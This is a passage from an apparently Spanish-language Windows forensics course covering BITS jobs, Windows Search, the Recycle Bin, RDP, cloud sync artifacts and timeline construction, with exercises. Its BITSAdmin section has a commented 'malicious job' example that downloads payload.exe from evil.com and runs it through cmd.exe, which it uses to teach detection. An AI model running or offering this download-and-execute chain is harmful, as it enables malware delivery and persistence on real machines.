# Busqueda de exploits:
# Explotacion de vulnerabilidad → crash en proceso
# WER guarda el crash dump
# Analisis: vol -f wer_dump.dmp windows.malfind
```

### 17.6 BITSAdmin Forensics

```powershell
# BITS (Background Intelligent Transfer Service)
# Usado por malware para descargar payloads

# Artefactos:
# %ProgramData%\Microsoft\Network\Downloader\
# Registry: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS

# Comandos de investigacion:
bitsadmin /list /allusers
Get-BitsTransfer | Format-List *

# Deteccion:
# - Jobs BITS creados por procesos no autorizados
# - URLs de descarga sospechosas en jobs BITS
# - Jobs BITS persistentes

# Ejemplo de job malicioso:
# bitsadmin /create evil
# bitsadmin /addfile evil http://evil.com/payload.exe C:\evil.exe
# bitsadmin /setnotifycmdline evil cmd.exe "/c C:\evil.exe"
# bitsadmin /resume evil
```

### 17.7 Ejercicios Practicos Avanzados

**Ejercicio 17.1:** Analiza un script PowerShell ofuscado: decodifica base64, expande compression, y extrae el [payload](../raw/m3t4spl01t.md#payloads).

**Ejercicio 17.2:** Analiza un archivo LNK sospechoso: identifica target, argumentos, MAC address de origen, y timestamps.

**Ejercicio 17.3:** Examina JumpLists para identificar que archivos abrio el usuario y con que aplicaciones.

**Ejercicio 17.4:** Busca en SRUM evidencia de exfiltracion de datos (alta transferencia de [red](../raw/r3d3s-f0nd4m3nt0s.md) desde [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) no autorizado).

**Ejercicio 17.5:** Construye un timeline [forense](../raw/w1n-f0r3ns1cs.md#forense) completo que integre: MFT, USN, Prefetch, [event logs](../raw/w1n-f0r3ns1cs.md#event-logs), SRUM, LNK, y JumpLists.

## 18. Windows Search Forensics

### 18.1 Windows Search Database

```powershell
# Windows Search indexa archivos para busqueda rapida
# Base de datos: %ProgramData%\Microsoft\Search\Data\Applications\Windows\Windows.edb
# Formato: ESE (Extensible Storage Engine)

# Informacion almacenada:
# - Nombres de archivo
# - Rutas completas
# - Tipos de archivo
# - Autores
# - Fechas de modificacion
# - Contenido de archivos indexados

# Herramientas:
python3 -c "
import pyesedb
esedb = pyesedb.file()
esedb.open('Windows.edb')
for table in esedb.tables:
    print(f'Table: {table.name}')
    for record in table.records:
        print(record.get_value_data(0))
"

# Buscar terminos interesantes:
# - Nombres de malware
# - URLs en documentos
# - Credenciales en texto
# - Datos de configuracion
```

### 18.2 Recycle Bin Forensics

```powershell
# Recycle Bin ($Recycle.Bin en cada volumen)
# Cada usuario tiene su carpeta por SID

# Archivos:
# $I<name>: Metadatos (nombre original, path, fechas, tamano)
# $R<name>: Datos del archivo (el contenido borrado)

# Herramientas:
# Rifiuti2: analiza $Recycle.Bin
# RBCmd.exe (Eric Zimmerman): parsea archivos $I

RBCmd.exe -d "C:\$Recycle.Bin\S-1-5-21-1234-5678" --csv output.csv

# Informacion:
# - Nombre original del archivo
# - Path completo original
# - Fecha de borrado
# - Tamanos
# - Es archivo o directorio
```

## 19. Remote Desktop Forensics

### 19.1 RDP Artefactos

```powershell
# Artefactos de conexiones RDP:

# 1. Registry - Servers list:
# HKCU\Software\Microsoft\Terminal Server Client\Servers

# 2. Registry - MRU connections:
# HKCU\Software\Microsoft\Terminal Server Client\Default

# 3. Bitmap cache:
# %UserProfile%\AppData\Local\Microsoft\Terminal Server Client\Cache\*
# Contiene fragments de pantalla de sesiones RDP

# 4. Logs:
# Microsoft-Windows-TerminalServices-*.evtx

# 5. RDP Files (.rdp):
# %UserProfile%\Documents\Default.rdp

# Herramientas:
# BMC-Tools: Extrae imagenes de bitmap cache
# Chainsaw: Busca eventos RDP
python3 bmc_extract.py -i Cache0001.bin -o output/

# Event IDs:
# 4778: Session reconnected
# 4779: Session disconnected
# 21: Remote Desktop Services: session logon
# 25: Remote Desktop Services: session reconnection
# 1149: User authentication succeeded
```

### 19.2 Detectar Acceso Remoto

```powershell
# Indicadores de acceso remoto no autorizado:
$rdpEvents = Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" |
    Where-Object Id -in 21, 22, 25

$rdpEvents | Select-Object TimeCreated, @{n='User';e={$_.Properties[0].Value}},
    @{n='IP';e={$_.Properties[1].Value}}

# Buscar accesos desde IPs externas
# Horarios inusuales
# Cuentas que no deberian tener RDP
# Conexiones administrativas sin justificacion
```

## 20. [cloud](../raw/cl0ud-h4ck1ng.md) Sync Forensics

### 20.1 OneDrive Forensics

```powershell
# Artefactos de OneDrive:
# %UserProfile%\OneDrive - Company\
# %LocalAppData%\Microsoft\OneDrive\
# Registry: HKCU\Software\Microsoft\OneDrive

# Informacion:
# - Archivos sincronizados
# - Fechas de modificacion
# - Conflictos de versiones
# - Archivos eliminados de la nube

# Buscar:
# - Archivos de interes subidos a la nube
# - Metadata de sincronizacion
# - Cache local de archivos no disponibles offline
```

### 20.2 Google Drive / Dropbox Forensics

```powershell
# Google Drive:
# %LocalAppData%\Google\Drive\
# Registry: HKCU\Software\Google\Drive

# Dropbox:
# %AppData%\Dropbox\
# %LocalAppData%\Dropbox\
# Registry: HKCU\Software\Dropbox

# Informacion:
# - Archivos sincronizados
# - Cache local
# - Datos de cuenta
# - Logs de sincronizacion
```

## 21. Full Timeline Construction Workshop

### 21.1 Metodologia

```powershell
# Timeline completa de 8 pasos:

# Paso 1: Recolectar artefactos
# - KAPE o manual (MFT, USN, Event Logs, Prefetch, etc.)

# Paso 2: Parsear cada artefacto
# MFTECmd.exe -f "\$MFT" --csv mft.csv
# PECmd.exe -d "C:\Windows\Prefetch" --csv prefetch.csv
# EvtxECmd.exe -f "Security.evtx" --csv security_events.csv

# Paso 3: Normalizar timestamps
# Todos a UTC + formato ISO 8601

# Paso 4: Combinar en timeline unica
$timeline = @()
Get-ChildItem *.csv | ForEach-Object {
    $data = Import-Csv $_.FullName
    $timeline += $data
}
$timeline | Export-Csv full_timeline.csv

# Paso 5: Filtrar por periodo del incidente
$incidentStart = "2024-05-20T00:00:00Z"
$incidentEnd = "2024-05-21T00:00:00Z"
$filtered = $timeline | Where-Object {
    $_.Timestamp -ge $incidentStart -and $_.Timestamp -le $incidentEnd
}

# Paso 6: Identificar anomalias
# - Procesos ejecutados fuera de horario laboral
# - Archivos creados en TMP
# - Conexiones de red a IPs externas
# - Cambios en registro (run keys, servicios)

# Paso 7: Correlacionar eventos
# Ejemplo: Conexion de red + descarga + ejecucion en <5 segundos

# Paso 8: Documentar hallazgos
```

### 21.2 Ejercicio Practico de Timeline

**Ejercicio 21.1:** Construye una timeline [forense](../raw/w1n-f0r3ns1cs.md#forense) de un incidente simulado. Debes:
1. Recolectar y parsear 5+ artefactos
2. Identificar el momento exacto del compromiso
3. Rastrear la cadena completa del ataque
4. Identificar el vector de entrada
5. Documentar todas las acciones del atacante
6. Producir un reporte ejecutivo

